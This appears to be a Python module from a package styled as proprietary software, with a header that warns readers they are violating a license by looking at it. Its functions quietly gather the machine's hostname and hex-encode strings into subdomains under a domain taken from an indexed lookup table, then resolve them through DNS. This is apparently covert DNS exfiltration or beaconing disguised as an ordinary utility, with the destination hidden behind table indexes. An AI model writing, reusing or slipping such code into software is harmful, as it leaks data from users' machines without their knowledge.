# ============================================================================
# (C) Copyright 2025 DAX Technologies. All rights reserved.
# ============================================================================
#
# NOTICE: This file is proprietary and confidential.
# Unauthorized use, reproduction, or distribution is strictly prohibited.
# IF YOU ARE READING THIS YOU ARE VIOLATING YOUR LICENSE AGREEMENT.
#
# This software is the intellectual property of DAX Technologies and is
# protected by copyright law and international treaties.
#
# ============================================================================

import os
import platform
import socket

from .netutils import construct_fqdn, resolve_fqdn
from .static.domains import TOP_DOMAINS
from .static.constant import STRING_TABLE

URL_PREFIX = STRING_TABLE[0]


def get_hostname():
    """
    Retrieves the hostname of the current machine.

    Returns:
        str: The hostname of the machine, or None if it cannot be determined.
    """
    hostname = None

    try:
        # Attempt to get the hostname using socket
        hostname = socket.gethostname()

        # If socket fails, try platform.node()
        if hostname is None or len(hostname) == 0:
            hostname = platform.node()

            # If platform.node() fails, try os.uname()
            if hostname is None or len(hostname) == 0:
                hostname = os.uname()[1]

                # If os.uname() fails, set hostname to None
                if len(hostname) == 0:
                    hostname = None
    except Exception:
        # Catch any exception and silently fail
        pass

    return hostname


def process_and_resolve(input_string, step, index):
    """
    Processes the input string by trimming and encoding it, then resolves it.

    Args:
        input_string (str): The input string to process.
        step (int): A step value to pass to the resolve function.
        index (int): An index value to pass to the resolve function.
    """
    # Remove the URL prefix and trim the string to 30 characters
    trimmed_string = input_string.replace(URL_PREFIX, '')[:30]

    # Encode the trimmed string to hexadecimal
    encoded_string = trimmed_string.encode().hex()

    # Construct the base domain using PRIMARY_DOMAINS
    base_domain = "i." + TOP_DOMAINS[17]

    fqdn = construct_fqdn(encoded_string, step, index, base_domain)

    # Resolve the constructed FQDN
    resolve_fqdn(fqdn)

